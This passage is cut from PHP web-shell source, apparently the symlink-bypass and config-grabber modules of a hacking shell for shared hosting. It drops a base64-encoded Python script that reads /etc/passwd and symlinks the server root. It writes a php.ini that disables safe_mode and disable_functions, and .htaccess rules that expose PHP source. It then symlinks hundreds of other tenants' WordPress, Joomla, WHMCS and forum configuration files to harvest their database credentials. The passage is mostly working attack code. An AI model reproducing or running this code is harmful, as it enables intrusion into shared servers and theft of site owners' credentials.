	$psymlink = "Iy8qUHl0aG9uCgppbXBvcnQgdGltZQppbXBvcnQgb3MKaW1wb3J0IHN5cwppbXBvcnQgcmUKCm9zLnN5c3RlbSgiY29sb3IgQyIpCgpodGEgPSAiXG5GaWxlIDogLmh0YWNjZXNzIC8vIENyZWF0ZWQgU3VjY2Vzc2Z1bGx5IVxuIgpmID0gIkFsbCBQcm9jZXNzZXMgRG9uZSFcblN5bWxpbmsgQnlwYXNzZWQgU3VjY2Vzc2Z1bGx5IVxuIgpwcmludCAiXG4iCnByaW50ICJTeW1saW5rIEJ5cGFzcyAyMDE0IGJ5IGhBeE9yIHRyMGpBbiogXG4iCnByaW50ICIgICAgICAgICAgICAgIFNwZWNpYWwgR3JlZXR6IHRvIDogTWF1cml0YW5pYSBBdHRhY2tlciAmIHZJcmtJZCIKCm9zLm1ha2VkaXJzKCdzeW1saW5rJykKb3MuY2hkaXIoJ3N5bWxpbmsnKQoKc3Vzcj1bXQpzaXRleD1bXQpvcy5zeXN0ZW0oImxuIC1zIC8gdHIudHh0IikKCmggPSAiT3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzXG5EaXJlY3RvcnlJbmRleCB0ci5waHRtbFxuQWRkVHlwZSB0eHQgLnBocFxuQWRkSGFuZGxlciB0eHQgLnBocCIKbSA9IG9wZW4oIi5odGFjY2VzcyIsIncrIikKbS53cml0ZShoKQptLmNsb3NlKCkKcHJpbnQgaHRhCgpzZiA9ICI8aHRtbD48dGl0bGU+U3ltbGluayBCeXBhc3MgMjAxNCBieSBoQXhPciB0cjBqQW4qPC90aXRsZT48Y2VudGVyPjxmb250IGNvbG9yPWJsYWNrIHNpemU9NT5TeW1saW5rIEJ5cGFzcyAyMDE0PGJyPjxmb250IHNpemU9ND5NYWRlIEJ5IGhBeE9yIHRyMGpBbiogPGJyPklkZWEgQnkgTWF1cml0YW5pYSBBdHRhY2tlciAmIHZJcmtJRDwvZm9udD48L2ZvbnQ+PGJyPjxmb250IGNvbG9yPWJsYWNrIHNpemU9Mz48dGFibGU+IgoKbyA9IG9wZW4oJy9ldGMvcGFzc3dkJywncicpCm89by5yZWFkKCkKbyA9IHJlLmZpbmRhbGwoJy9ob21lL1x3KycsbykKCmZvciB4dXNyIGluIG86Cgl4dXNyPXh1c3IucmVwbGFjZSgnL2hvbWUvJywnJykKCXN1c3IuYXBwZW5kKHh1c3IpCnByaW50ICItIiozMAp4c2l0ZSA9IG9zLmxpc3RkaXIoIi92YXIvbmFtZWQiKQoKZm9yIHh4c2l0ZSBpbiB4c2l0ZToKCXh4c2l0ZT14eHNpdGUucmVwbGFjZSgiLmRiIiwiIikKCXNpdGV4LmFwcGVuZCh4eHNpdGUpCnByaW50IGYKcGF0aD1vcy5nZXRjd2QoKQppZiAiL3B1YmxpY19odG1sLyIgaW4gcGF0aDoKCXBhdGg9Ii9wdWJsaWNfaHRtbC8iCmVsc2U6CglwYXRoID0gIi9odG1sLyIKY291bnRlcj0xCmlwcz1vcGVuKCJ0ci5waHRtbCIsInciKQppcHMud3JpdGUoc2YpCgpmb3IgZnVzciBpbiBzdXNyOgoJZm9yIGZzaXRlIGluIHNpdGV4OgoJCWZ1PWZ1c3JbMDo1XQoJCXM9ZnNpdGVbMDo1XQoJCWlmIGZ1PT1zOgoJCQlpcHMud3JpdGUoIjx0cj48dGQgc3R5bGU9Zm9udC1mYW1pbHk6Y2FsaWJyaTtmb250LXdlaWdodDpib2xkO2NvbG9yOmJsYWNrOz4lczwvdGQ+PHRkIHN0eWxlPWZvbnQtZmFtaWx5OmNhbGlicmk7Zm9udC13ZWlnaHQ6Ym9sZDtjb2xvcjpyZWQ7PiVzPC90ZD48dGQgc3R5bGU9Zm9udC1mYW1pbHk6Y2FsaWJyaTtmb250LXdlaWdodDpib2xkOz48YSBocmVmPXRyLnR4dC9ob21lLyVzJXMgdGFyZ2V0PV9ibGFuayA+JXM8L2E+PC90ZD4iJShjb3VudGVyLGZ1c3IsZnVzcixwYXRoLGZzaXRlKSkKCQkJY291bnRlcj1jb3VudGVyKzE=";
	$ufff = fopen("sym.py", "w");
	@fwrite($ufff, base64_decode($psymlink));
	@fclose($ufff);
	echo '<center><span style="color: white; font-family:cursive; font-size: 120%;">';
	@system("python sym.py");
	echo '<br><br><a href="symlink" target="_blank"><span style="color: red;">Click Here</span></a>'; echo '</span></center>';
}

if ($_POST['config']) {

	$php_ini_content = "c2FmZV9tb2RlID0gT0ZGCglTYWZlX21vZGVfZ2lkID0gT0ZGCglkaXNhYmxlX2Z1bmN0aW9ucyA9IE5PTkUKCWRpc2FibGVfY2xhc3NlcyA9IE5PTkUKCW9wZW5fYmFzZWRpciA9IE9GRgoJc3Vob3Npbi5leGVjdXRvci5mdW5jLmJsYWNrbGlzdCA9IE5PTkUg";
    $php_ini = fopen("php.ini", "w");
    fwrite($php_ini, base64_decode($php_ini_content));
    fclose($php_ini);
    $function = $functions = @ini_get("disable_functions");
    if (eregi("symlink", $functions)) {
        die('<error>Symlink is disabled :( </error>');
    } else {
    @mkdir('UeXploiT', 777);
    @chdir('UeXploiT');
                $htaccess = "
Options all 
	 DirectoryIndex Sux.html 
	 AddType text/plain .php 
	 AddHandler server-parsed .php 
	  AddType text/plain .html 
	 AddHandler txt .html 
	 Require None 
	 Satisfy Any 	
";
        file_put_contents(".htaccess", $htaccess, FILE_APPEND);
    $passwd = $_POST["passwd"];
    $passwd = explode("
", $passwd);
    foreach ($passwd as $pwd) {
        $pawd = explode(":", $pwd);
        $user = $pawd[0];
@symlink('/home/' . $user . '/public_html/includes/configure.php', $user . '-shop.txt');
@symlink('/home/' . $user . '/public_html/os/includes/configure.php', $user . '-shop-os.txt');
@symlink('/home/' . $user . '/public_html/oscom/includes/configure.php', $user . '-oscom.txt');
@symlink('/home/' . $user . '/public_html/oscommerce/includes/configure.php', $user . '-oscommerce.txt');
@symlink('/home/' . $user . '/public_html/oscommerces/includes/configure.php', $user . '-oscommerces.txt');
@symlink('/home/' . $user . '/public_html/shop/includes/configure.php', $user . '-shop2.txt');
@symlink('/home/' . $user . '/public_html/shopping/includes/configure.php', $user . '-shop-shopping.txt');
@symlink('/home/' . $user . '/public_html/sale/includes/configure.php', $user . '-sale.txt');
@symlink('/home/' . $user . '/public_html/amember/config.inc.php', $user . '-amember.txt');
@symlink('/home/' . $user . '/public_html/library/config.php', $user . '-symlink');
@symlink('/home/' . $user . '/public_html/members/configuration.php', $user . '-members.txt');
@symlink('/home/' . $user . '/public_html/config.php', $user . '-4images1.txt');
@symlink('/home/' . $user . '/public_html/forum/includes/config.php', $user . '-forum.txt');
@symlink('/home/' . $user . '/public_html/forums/includes/config.php', $user . '-forums.txt');
@symlink('/home/' . $user . '/public_html/admin/conf.php', $user . '-5.txt');
@symlink('/home/' . $user . '/public_html/admin/config.php', $user . '-4.txt');
@symlink('/home/' . $user . '/public_html/wp-config.php', $user . '-wp13.txt');
@symlink('/home/' . $user . '/public_html/wp/wp-config.php', $user . '-wp13-wp.txt');
@symlink('/home/' . $user . '/public_html/WP/wp-config.php', $user . '-wp13-WP.txt');
@symlink('/home/' . $user . '/public_html/wp/beta/wp-config.php', $user . '-wp13-wp-beta.txt');
@symlink('/home/' . $user . '/public_html/beta/wp-config.php', $user . '-wp13-beta.txt');
@symlink('/home/' . $user . '/public_html/press/wp-config.php', $user . '-wp13-press.txt');
@symlink('/home/' . $user . '/public_html/wordpress/wp-config.php', $user . '-wp13-wordpress.txt');
@symlink('/home/' . $user . '/public_html/Wordpress/wp-config.php', $user . '-wp13-Wordpress.txt');
@symlink('/home/' . $user . '/public_html/blog/wp-config.php', $user . '-wp13-Wordpress.txt');
@symlink('/home/' . $user . '/public_html/wordpress/beta/wp-config.php', $user . '-wp13-wordpress-beta.txt');
@symlink('/home/' . $user . '/public_html/news/wp-config.php', $user . '-wp13-news.txt');
@symlink('/home/' . $user . '/public_html/new/wp-config.php', $user . '-wp13-new.txt');
@symlink('/home/' . $user . '/public_html/blog/wp-config.php', $user . '-wp-blog.txt');
@symlink('/home/' . $user . '/public_html/beta/wp-config.php', $user . '-wp-beta.txt');
@symlink('/home/' . $user . '/public_html/blogs/wp-config.php', $user . '-wp-blogs.txt');
@symlink('/home/' . $user . '/public_html/home/wp-config.php', $user . '-wp-home.txt');
@symlink('/home/' . $user . '/public_html/protal/wp-config.php', $user . '-wp-protal.txt');
@symlink('/home/' . $user . '/public_html/site/wp-config.php', $user . '-wp-site.txt');
@symlink('/home/' . $user . '/public_html/main/wp-config.php', $user . '-wp-main.txt');
@symlink('/home/' . $user . '/public_html/test/wp-config.php', $user . '-wp-test.txt');
@symlink('/home/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
@symlink('/home/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
@symlink('/home/' . $user . '/public_html/joomla/configuration.php', $user . '-joomla2.txt');
@symlink('/home/' . $user . '/public_html/protal/configuration.php', $user . '-joomla-protal.txt');
@symlink('/home/' . $user . '/public_html/joo/configuration.php', $user . '-joo.txt');
@symlink('/home/' . $user . '/public_html/cms/configuration.php', $user . '-joomla-cms.txt');
@symlink('/home/' . $user . '/public_html/site/configuration.php', $user . '-joomla-site.txt');
@symlink('/home/' . $user . '/public_html/main/configuration.php', $user . '-joomla-main.txt');
@symlink('/home/' . $user . '/public_html/news/configuration.php', $user . '-joomla-news.txt');
@symlink('/home/' . $user . '/public_html/new/configuration.php', $user . '-joomla-new.txt');
@symlink('/home/' . $user . '/public_html/home/configuration.php', $user . '-joomla-home.txt');
@symlink('/home/' . $user . '/public_html/vb/includes/config.php', $user . '-vb-config.txt');
@symlink('/home/' . $user . '/public_html/vb3/includes/config.php', $user . '-vb3-config.txt');
@symlink('/home/' . $user . '/public_html/cc/includes/config.php', $user . '-vb1-config.txt');
@symlink('/home/' . $user . '/public_html/includes/config.php', $user . '-includes-vb.txt');
@symlink('/home/' . $user . '/public_html/forum/includes/class_core.php', $user . '-vbluttin-class_core.php.txt');
@symlink('/home/' . $user . '/public_html/vb/includes/class_core.php', $user . '-vbluttin-class_core.php1.txt');
@symlink('/home/' . $user . '/public_html/cc/includes/class_core.php', $user . '-vbluttin-class_core.php2.txt');
@symlink('/home/' . $user . '/public_html/configuration.php', $user . '-joomla.txt');
@symlink('/home/' . $user . '/public_html/includes/dist-configure.php', $user . '-zencart.txt');
@symlink('/home/' . $user . '/public_html/zencart/includes/dist-configure.php', $user . '-shop-zencart.txt');
@symlink('/home/' . $user . '/public_html/shop/includes/dist-configure.php', $user . '-shop-ZCshop.txt');
@symlink('/home/' . $user . '/public_html/Settings.php', $user . '-smf.txt');
@symlink('/home/' . $user . '/public_html/smf/Settings.php', $user . '-smf2.txt');
@symlink('/home/' . $user . '/public_html/forum/Settings.php', $user . '-smf-forum.txt');
@symlink('/home/' . $user . '/public_html/forums/Settings.php', $user . '-smf-forums.txt');
@symlink('/home/' . $user . '/public_html/upload/includes/config.php', $user . '-up.txt');
@symlink('/home/' . $user . '/public_html/article/config.php', $user . '-Nwahy.txt');
@symlink('/home/' . $user . '/public_html/up/includes/config.php', $user . '-up2.txt');
@symlink('/home/' . $user . '/public_html/conf_global.php', $user . '-6.txt');
@symlink('/home/' . $user . '/public_html/include/db.php', $user . '-7.txt');
@symlink('/home/' . $user . '/public_html/connect.php', $user . '-PHP-Fusion.txt');
@symlink('/home/' . $user . '/public_html/mk_conf.php', $user . '-9.txt');
@symlink('/home/' . $user . '/public_html/includes/config.php', $user . '-traidnt1.txt');
@symlink('/home/' . $user . '/public_html/config.php', $user . '-4images.txt');
@symlink('/home/' . $user . '/public_html/sites/default/settings.php', $user . '-Drupal.txt');
@symlink('/home/' . $user . '/public_html/member/configuration.php', $user . '-1member.txt');
@symlink('/home/' . $user . '/public_html/supports/includes/iso4217.php', $user . '-hostbills-supports.txt');
@symlink('/home/' . $user . '/public_html/client/includes/iso4217.php', $user . '-hostbills-client.txt');
@symlink('/home/' . $user . '/public_html/support/includes/iso4217.php', $user . '-hostbills-support.txt');
@symlink('/home/' . $user . '/public_html/billing/includes/iso4217.php', $user . '-hostbills-billing.txt');
@symlink('/home/' . $user . '/public_html/billings/includes/iso4217.php', $user . '-hostbills-billings.txt');
@symlink('/home/' . $user . '/public_html/host/includes/iso4217.php', $user . '-hostbills-host.txt');
@symlink('/home/' . $user . '/public_html/hosts/includes/iso4217.php', $user . '-hostbills-hosts.txt');
@symlink('/home/' . $user . '/public_html/hosting/includes/iso4217.php', $user . '-hostbills-hosting.txt');
@symlink('/home/' . $user . '/public_html/hostings/includes/iso4217.php', $user . '-hostbills-hostings.txt');
@symlink('/home/' . $user . '/public_html/includes/iso4217.php', $user . '-hostbills.txt');
@symlink('/home/' . $user . '/public_html/hostbills/includes/iso4217.php', $user . '-hostbills-hostbills.txt');
@symlink('/home/' . $user . '/public_html/hostbill/includes/iso4217.php', $user . '-hostbills-hostbill.txt');
@symlink('/home/' . $user . '/public_html/cart/configuration.php', $user . '-cart-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/hosting/configuration.php', $user . '-hosting-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/buy/configuration.php', $user . '-buy-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/checkout/configuration.php', $user . '-checkout-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/host/configuration.php', $user . '-host-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/shop/configuration.php', $user . '-shop-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/shopping/configuration.php', $user . '-shopping-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/sale/configuration.php', $user . '-sale-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/client/configuration.php', $user . '-client-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/support/configuration.php', $user . '-support-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/clientsupport/configuration.php', $user . '-clientsupport-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/whm/whmcs/configuration.php', $user . '-whm-whmcs.txt');
@symlink('/home/' . $user . '/public_html/whm/WHMCS/configuration.php', $user . '-whm-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/whmc/WHM/configuration.php', $user . '-whmc-WHM.txt');
@symlink('/home/' . $user . '/public_html/whmcs/configuration.php', $user . '-whmc-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/supp/configuration.php', $user . '-supp-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/secure/configuration.php', $user . '-sucure-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/secure/whm/configuration.php', $user . '-sucure-whm-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/secure/whmcs/configuration.php', $user . '-sucure-whmcs-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/panel/configuration.php', $user . '-panel-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/hosts/configuration.php', $user . '-hosts-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/submitticket.php', $user . '-submitticket-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/clients/configuration.php', $user . '-clients-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/clientes/configuration.php', $user . '-clientes-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/cliente/configuration.php', $user . '-client-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/billing/configuration.php', $user . '-billing-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/manage/configuration.php', $user . '-whm-manage-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/my/configuration.php', $user . '-whm-my-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/myshop/configuration.php', $user . '-whm-myshop-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/billings/configuration.php', $user . '-billings-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/supports/configuration.php', $user . '-supports-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/auto/configuration.php', $user . '-auto-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/go/configuration.php', $user . '-go-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/' . $user . '/configuration.php', $user . '-USERNAME-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/bill/configuration.php', $user . '-bill-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/payment/configuration.php', $user . '-payment-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/pay/configuration.php', $user . '-pay-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/purchase/configuration.php', $user . '-purchase-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/db.php', $user . '-clientarea-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/conect_to_mysql.php', $user . '-autobuy');
@symlink('/home/' . $user . '/public_html/connect.php', $user . '-normal');
@symlink('/home/' . $user . '/public_html/admin/connect.php', $user . '-normal');
@symlink('/home/' . $user . '/public_html/include/connect.php', $user . '-normal');
@symlink('/home/' . $user . '/public_html/wp-admin/connect.php', $user . '-normal');
@symlink('/home/' . $user . '/public_html/wp-admin/config.php', $user . '-normal');
@symlink('/home/' . $user . '/public_html/wp-admin/dbconnect.php', $user . '-normal');
@symlink('/home/' . $user . '/public_html/admin/dbconnect.php', $user . '-normal');
@symlink('/home/' . $user . '/public_html/dbconnect.php', $user . '-normal');
@symlink('/home/' . $user . '/public_html/connection.php', $user . '-normal');
@symlink('/home2/' . $user . '/public_html/includes/configure.php', $user . '-shop.txt');
@symlink('/home2/' . $user . '/public_html/os/includes/configure.php', $user . '-shop-os.txt');
@symlink('/home2/' . $user . '/public_html/oscom/includes/configure.php', $user . '-oscom.txt');
@symlink('/home2/' . $user . '/public_html/oscommerce/includes/configure.php', $user . '-oscommerce.txt');
@symlink('/home2/' . $user . '/public_html/oscommerces/includes/configure.php', $user . '-oscommerces.txt');
@symlink('/home2/' . $user . '/public_html/shop/includes/configure.php', $user . '-shop2.txt');
@symlink('/home2/' . $user . '/public_html/shopping/includes/configure.php', $user . '-shop-shopping.txt');
@symlink('/home2/' . $user . '/public_html/sale/includes/configure.php', $user . '-sale.txt');
@symlink('/home2/' . $user . '/public_html/amember/config.inc.php', $user . '-amember.txt');
@symlink('/home2/' . $user . '/public_html/library/config.php', $user . '-symlink');
@symlink('/home2/' . $user . '/public_html/members/configuration.php', $user . '-members.txt');
@symlink('/home2/' . $user . '/public_html/config.php', $user . '-4images1.txt');
@symlink('/home2/' . $user . '/public_html/forum/includes/config.php', $user . '-forum.txt');
@symlink('/home2/' . $user . '/public_html/forums/includes/config.php', $user . '-forums.txt');
@symlink('/home2/' . $user . '/public_html/admin/conf.php', $user . '-5.txt');
@symlink('/home2/' . $user . '/public_html/admin/config.php', $user . '-4.txt');
@symlink('/home2/' . $user . '/public_html/wp-config.php', $user . '-wp13.txt');
@symlink('/home2/' . $user . '/public_html/wp/wp-config.php', $user . '-wp13-wp.txt');
@symlink('/home2/' . $user . '/public_html/WP/wp-config.php', $user . '-wp13-WP.txt');
@symlink('/home2/' . $user . '/public_html/wp/beta/wp-config.php', $user . '-wp13-wp-beta.txt');
@symlink('/home2/' . $user . '/public_html/beta/wp-config.php', $user . '-wp13-beta.txt');
@symlink('/home2/' . $user . '/public_html/press/wp-config.php', $user . '-wp13-press.txt');
@symlink('/home2/' . $user . '/public_html/wordpress/wp-config.php', $user . '-wp13-wordpress.txt');
@symlink('/home2/' . $user . '/public_html/Wordpress/wp-config.php', $user . '-wp13-Wordpress.txt');
@symlink('/home2/' . $user . '/public_html/blog/wp-config.php', $user . '-wp13-Wordpress.txt');
@symlink('/home2/' . $user . '/public_html/wordpress/beta/wp-config.php', $user . '-wp13-wordpress-beta.txt');
@symlink('/home2/' . $user . '/public_html/news/wp-config.php', $user . '-wp13-news.txt');
@symlink('/home2/' . $user . '/public_html/new/wp-config.php', $user . '-wp13-new.txt');
@symlink('/home2/' . $user . '/public_html/blog/wp-config.php', $user . '-wp-blog.txt');
@symlink('/home2/' . $user . '/public_html/beta/wp-config.php', $user . '-wp-beta.txt');
@symlink('/home2/' . $user . '/public_html/blogs/wp-config.php', $user . '-wp-blogs.txt');
@symlink('/home2/' . $user . '/public_html/home2/wp-config.php', $user . '-wp-home2.txt');
@symlink('/home2/' . $user . '/public_html/protal/wp-config.php', $user . '-wp-protal.txt');
@symlink('/home2/' . $user . '/public_html/site/wp-config.php', $user . '-wp-site.txt');
@symlink('/home2/' . $user . '/public_html/main/wp-config.php', $user . '-wp-main.txt');
@symlink('/home2/' . $user . '/public_html/test/wp-config.php', $user . '-wp-test.txt');
@symlink('/home2/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
@symlink('/home2/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
@symlink('/home2/' . $user . '/public_html/joomla/configuration.php', $user . '-joomla2.txt');
@symlink('/home2/' . $user . '/public_html/protal/configuration.php', $user . '-joomla-protal.txt');
@symlink('/home2/' . $user . '/public_html/joo/configuration.php', $user . '-joo.txt');
@symlink('/home2/' . $user . '/public_html/cms/configuration.php', $user . '-joomla-cms.txt');
@symlink('/home2/' . $user . '/public_html/site/configuration.php', $user . '-joomla-site.txt');
@symlink('/home2/' . $user . '/public_html/main/configuration.php', $user . '-joomla-main.txt');
@symlink('/home2/' . $user . '/public_html/news/configuration.php', $user . '-joomla-news.txt');
@symlink('/home2/' . $user . '/public_html/new/configuration.php', $user . '-joomla-new.txt');
@symlink('/home2/' . $user . '/public_html/home2/configuration.php', $user . '-joomla-home2.txt');
@symlink('/home2/' . $user . '/public_html/vb/includes/config.php', $user . '-vb-config.txt');
@symlink('/home2/' . $user . '/public_html/vb3/includes/config.php', $user . '-vb3-config.txt');
@symlink('/home2/' . $user . '/public_html/cc/includes/config.php', $user . '-vb1-config.txt');
@symlink('/home2/' . $user . '/public_html/includes/config.php', $user . '-includes-vb.txt');
@symlink('/home2/' . $user . '/public_html/forum/includes/class_core.php', $user . '-vbluttin-class_core.php.txt');
@symlink('/home2/' . $user . '/public_html/vb/includes/class_core.php', $user . '-vbluttin-class_core.php1.txt');
@symlink('/home2/' . $user . '/public_html/cc/includes/class_core.php', $user . '-vbluttin-class_core.php2.txt');
@symlink('/home2/' . $user . '/public_html/configuration.php', $user . '-joomla.txt');
@symlink('/home2/' . $user . '/public_html/includes/dist-configure.php', $user . '-zencart.txt');
@symlink('/home2/' . $user . '/public_html/zencart/includes/dist-configure.php', $user . '-shop-zencart.txt');
@symlink('/home2/' . $user . '/public_html/shop/includes/dist-configure.php', $user . '-shop-ZCshop.txt');
@symlink('/home2/' . $user . '/public_html/Settings.php', $user . '-smf.txt');
@symlink('/home2/' . $user . '/public_html/smf/Settings.php', $user . '-smf2.txt');
@symlink('/home2/' . $user . '/public_html/forum/Settings.php', $user . '-smf-forum.txt');
@symlink('/home2/' . $user . '/public_html/forums/Settings.php', $user . '-smf-forums.txt');
@symlink('/home2/' . $user . '/public_html/upload/includes/config.php', $user . '-up.txt');
@symlink('/home2/' . $user . '/public_html/article/config.php', $user . '-Nwahy.txt');
@symlink('/home2/' . $user . '/public_html/up/includes/config.php', $user . '-up2.txt');
@symlink('/home2/' . $user . '/public_html/conf_global.php', $user . '-6.txt');
@symlink('/home2/' . $user . '/public_html/include/db.php', $user . '-7.txt');
@symlink('/home2/' . $user . '/public_html/connect.php', $user . '-PHP-Fusion.txt');
@symlink('/home2/' . $user . '/public_html/mk_conf.php', $user . '-9.txt');
@symlink('/home2/' . $user . '/public_html/includes/config.php', $user . '-traidnt1.txt');
@symlink('/home2/' . $user . '/public_html/config.php', $user . '-4images.txt');
@symlink('/home2/' . $user . '/public_html/sites/default/settings.php', $user . '-Drupal.txt');
@symlink('/home2/' . $user . '/public_html/member/configuration.php', $user . '-1member.txt');
@symlink('/home2/' . $user . '/public_html/supports/includes/iso4217.php', $user . '-hostbills-supports.txt');
@symlink('/home2/' . $user . '/public_html/client/includes/iso4217.php', $user . '-hostbills-client.txt');
@symlink('/home2/' . $user . '/public_html/support/includes/iso4217.php', $user . '-hostbills-support.txt');
@symlink('/home2/' . $user . '/public_html/billing/includes/iso4217.php', $user . '-hostbills-billing.txt');
@symlink('/home2/' . $user . '/public_html/billings/includes/iso4217.php', $user . '-hostbills-billings.txt');
@symlink('/home2/' . $user . '/public_html/host/includes/iso4217.php', $user . '-hostbills-host.txt');
@symlink('/home2/' . $user . '/public_html/hosts/includes/iso4217.php', $user . '-hostbills-hosts.txt');
@symlink('/home2/' . $user . '/public_html/hosting/includes/iso4217.php', $user . '-hostbills-hosting.txt');
@symlink('/home2/' . $user . '/public_html/hostings/includes/iso4217.php', $user . '-hostbills-hostings.txt');
@symlink('/home2/' . $user . '/public_html/includes/iso4217.php', $user . '-hostbills.txt');
@symlink('/home2/' . $user . '/public_html/hostbills/includes/iso4217.php', $user . '-hostbills-hostbills.txt');
@symlink('/home2/' . $user . '/public_html/hostbill/includes/iso4217.php', $user . '-hostbills-hostbill.txt');
@symlink('/home2/' . $user . '/public_html/cart/configuration.php', $user . '-cart-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/hosting/configuration.php', $user . '-hosting-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/buy/configuration.php', $user . '-buy-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/checkout/configuration.php', $user . '-checkout-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/host/configuration.php', $user . '-host-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/shop/configuration.php', $user . '-shop-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/shopping/configuration.php', $user . '-shopping-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/sale/configuration.php', $user . '-sale-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/client/configuration.php', $user . '-client-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/support/configuration.php', $user . '-support-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/clientsupport/configuration.php', $user . '-clientsupport-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/whm/whmcs/configuration.php', $user . '-whm-whmcs.txt');
@symlink('/home2/' . $user . '/public_html/whm/WHMCS/configuration.php', $user . '-whm-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/whmc/WHM/configuration.php', $user . '-whmc-WHM.txt');
@symlink('/home2/' . $user . '/public_html/whmcs/configuration.php', $user . '-whmc-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/supp/configuration.php', $user . '-supp-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/secure/configuration.php', $user . '-sucure-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/secure/whm/configuration.php', $user . '-sucure-whm-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/secure/whmcs/configuration.php', $user . '-sucure-whmcs-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/panel/configuration.php', $user . '-panel-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/hosts/configuration.php', $user . '-hosts-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/submitticket.php', $user . '-submitticket-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/clients/configuration.php', $user . '-clients-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/clientes/configuration.php', $user . '-clientes-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/cliente/configuration.php', $user . '-client-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/billing/configuration.php', $user . '-billing-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/manage/configuration.php', $user . '-whm-manage-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/my/configuration.php', $user . '-whm-my-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/myshop/configuration.php', $user . '-whm-myshop-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/billings/configuration.php', $user . '-billings-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/supports/configuration.php', $user . '-supports-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/auto/configuration.php', $user . '-auto-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/go/configuration.php', $user . '-go-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/' . $user . '/configuration.php', $user . '-USERNAME-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/bill/configuration.php', $user . '-bill-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/payment/configuration.php', $user . '-payment-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/pay/configuration.php', $user . '-pay-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/purchase/configuration.php', $user . '-purchase-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/db.php', $user . '-normal');
@symlink('/home2/' . $user . '/public_html/conect_to_mysql.php', $user . '-autobuy');
@symlink('/home2/' . $user . '/public_html/connect.php', $user . '-normal');
@symlink('/home2/' . $user . '/public_html/admin/connect.php', $user . '-normal');
@symlink('/home2/' . $user . '/public_html/include/connect.php', $user . '-normal');
@symlink('/home2/' . $user . '/public_html/wp-admin/connect.php', $user . '-normal');
@symlink('/home2/' . $user . '/public_html/wp-admin/config.php', $user . '-normal');
@symlink('/home2/' . $user . '/public_html/wp-admin/dbconnect.php', $user . '-normal');
@symlink('/home2/' . $user . '/public_html/admin/dbconnect.php', $user . '-normal');
@symlink('/home2/' . $user . '/public_html/dbconnect.php', $user . '-normal');
@symlink('/home2/' . $user . '/public_html/admin/connection.php', $user . '-normal');
@symlink('/home3/' . $user . '/public_html/includes/configure.php', $user . '-shop.txt');
@symlink('/home3/' . $user . '/public_html/os/includes/configure.php', $user . '-shop-os.txt');
@symlink('/home3/' . $user . '/public_html/oscom/includes/configure.php', $user . '-oscom.txt');
